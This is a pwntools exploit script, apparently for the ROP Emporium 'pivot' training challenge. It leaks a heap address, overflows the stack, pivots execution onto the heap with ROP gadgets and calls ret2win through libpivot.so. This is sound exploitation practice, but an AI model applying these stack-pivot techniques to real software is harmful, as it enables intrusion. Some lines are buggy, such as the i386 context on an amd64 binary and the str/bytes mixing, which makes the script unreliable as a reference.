#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template pivot
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pivot')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

context.clear(arch='i386')
filename = './pivot'
libpivot = './libpivot.so'

elf = ELF(filename)
lib = ELF(libpivot)
io = process(filename)

io.recvuntil("pivot: ")
heap_address= int(io.recvline().decode('UTF-8').split(' ')[-1], 16)
log.info("Heap: " +hex(heap_address))
heap_address = p64(heap_address)


foothold_call = p64(elf.plt.foothold_function)
foothold_reloc= p64(elf.got.foothold_function)

r2w_offset = p64(lib.sym.ret2win - lib.sym.foothold_function)

call_rax = p64(0x4006b0)
add_rax_rbp= p64(0x4009c4)
pop_rbp = p64(0x4007c8)
pop_rax = p64(0x4009bb)

#usefulGadgets 
xchg_rax_rsp = p64(0x4009bd)
mov_rax_rax = p64(0x4009c0)

def smash_stack():
    smash = ROP(elf)
    smash.raw(cyclic(40))
    smash.raw(pop_rax)
    smash.raw(heap_address)
    smash.raw(xchg_rax_rsp)
    print(smash.dump())
    return smash.chain()

def buffer_heap():
    bufferHeap = ROP(elf)
    bufferHeap.raw(foothold_call)
    bufferHeap.raw(pop_rax)
    bufferHeap.raw(foothold_reloc)
    
    bufferHeap.raw(mov_rax_rax)
    bufferHeap.raw(pop_rbp)
    bufferHeap.raw(r2w_offset)
    bufferHeap.raw(add_rax_rbp)
    bufferHeap.raw(call_rax)
    
    bufferHeap = str(bufferHeap)+ b'B'*(255-len(str(bufferHeap)))
    
    return bufferHeap

def send_lines(heap_buffer, stack_smash):
    io.sendline(heap_buffer)
    io.sendline(stack_smash)
    data=io.recvall()
    print(data.decode())
    

payload_smash = ""
payload_smash += smash_stack()

payload_buff_heap = ""
payload_buff_heap += buffer_heap()

print("length of payload_smash: "+str(len(payload_smash)))
print("length of payload_buff_heap: "+str(len(payload_buff_heap)))

send_lines(payload_buff_heap,payload_smash)
